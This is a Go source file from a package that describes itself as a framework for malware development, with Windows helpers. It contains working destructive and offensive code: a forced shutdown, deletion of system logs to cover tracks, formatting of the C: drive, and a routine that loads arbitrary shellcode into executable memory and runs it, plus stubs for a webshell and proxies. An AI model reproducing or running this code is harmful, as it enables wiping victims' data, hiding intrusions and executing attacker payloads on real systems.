// Package coldfire is a framework that provides functions
// for malware development that are mostly compatible with
// Linux and Windows operating systems.
package coldfire

import (
	"os"
	"syscall"
	"unsafe"
)

func shutdown() error {
	c := "shutdown -s -t 60"
	_, err := cmdOut(c)

	return err
}

func clearLogs() error {
	os.Chdir("%windir%\\system32\\config")
	_, err := cmdOut("del *log /a /s /q /f")
	if err != nil {
		return err
	}

	return nil
}

func wipe() error {
	cmd := "format c: /fs:ntfs"
	_, err := cmdOut(cmd)
	if err != nil {
		return err
	}

	return nil
}

func runShellcode(sc []byte, bg bool){
	var bg_run uintptr = 0x00
	if (bg) {
		bg_run = 0x00000004
	}
	kernel32 := syscall.MustLoadDLL("kernel32.dll")
	VirtualAlloc := kernel32.MustFindProc("VirtualAlloc")
	procCreateThread := kernel32.MustFindProc("CreateThread")
	waitForSingleObject := kernel32.MustFindProc("WaitForSingleObject")
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(sc)), 0x2000|0x1000, syscall.PAGE_EXECUTE_READWRITE)
	ptr := (*[990000]byte)(unsafe.Pointer(addr))
	for i, value := range sc {
		ptr[i] = value
	}
	threadHandle, _, _ := procCreateThread.Call(0, 0, addr, 0, bg_run, 0)
	waitForSingleObject.Call(threadHandle, uintptr(^uint(0)))
}

// func dialog(message, title string) {
// 	zenity.Info(message, zenity.Title(title))
// }

// func SplitMultiSep(s string, seps []string) []string {
// 	f := func(c rune) bool {
// 		for _, sep := range seps {
// 			if c == sep { // what?
// 				return true
// 			}
// 		}
// 	}
// 	fields := strings.FieldsFunc(s, f)
// 	return fields
// }

/*

func keyboard_emul(keys string) error {

}

func proxy_tcp() error {

}

func proxy_udp() error {

}

func proxy_http() error {

}

func webshell(param, password string) error {

}

func stamp() {

}

func detect_user_interaction() (bool, error) {

}*/
